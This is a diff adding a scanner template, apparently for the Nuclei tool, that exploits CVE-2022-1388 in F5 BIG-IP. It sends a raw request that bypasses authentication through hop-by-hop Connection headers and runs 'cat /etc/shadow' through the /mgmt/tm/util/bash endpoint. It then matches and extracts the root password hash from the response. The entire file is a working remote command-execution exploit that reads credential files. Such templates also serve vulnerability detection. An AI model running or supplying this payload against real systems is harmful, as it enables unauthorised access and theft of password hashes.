@@ -1,0 +1,37 @@
+---
+id: CVE-2022-1388
+info:
+   name: bigip
+   author: secthebit
+   severity: critical
+
+requests:
+
+  - raw:
+      - |
+        POST /mgmt/tm/util/bash HTTP/1.1
+        User-Agent: Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1
+        Host: {{Hostname}}
+        X-F5-Auth-Token: anything
+        Authorization:  Basic YWRtaW46
+        Accept: */*
+        Content-type: application/json
+        Connection: close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host
+
+        {"command":"run", "utilCmdArgs": "-c 'cat /etc/shadow'"}
+
+      - |
+
+    matchers:
+      - type : regex
+        part:  body
+        regex:
+            - "root:.*"
+
+   
+ 
+    extractors:
+      - type : regex
+        part: body
+        regex:
+           - 'root:\$\d+\$\w+'
